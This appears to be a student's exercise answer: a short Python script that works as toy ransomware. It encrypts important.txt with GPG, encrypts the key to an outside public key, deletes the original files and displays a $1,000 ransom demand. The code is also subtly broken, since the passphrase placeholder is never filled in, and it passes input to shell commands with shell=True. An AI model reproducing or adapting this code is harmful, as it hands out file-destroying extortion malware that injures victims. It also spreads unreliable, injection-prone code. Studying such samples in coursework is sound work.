# Question 4
# Chow Keiren 7233450

#!/usr/bin/env python
import subprocess

key = input("Enter a key: ")

# Save the input key into file
with open("key.txt", "w") as f:
    f.write(key)

# Encrypt important.txt with symmetric encryption
subprocess.call("gpg --batch --pinentry-mode=loopback --passphrase {key} -c --armor --output important.txt.asc important.txt", shell=True)

# Encrypt key.txt with public encryption
subprocess.call("gpg --encrypt --recipient-file pubkey.gpg.asc --output key.txt.asc -e --armor key.txt", shell=True)

# Remove the following files
subprocess.call("rm -f key.txt", shell=True)
subprocess.call("rm -f important.txt", shell=True)

# display message
subprocess.call("xmessage -center 'Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send key.txt.asc to me.'", shell=True)
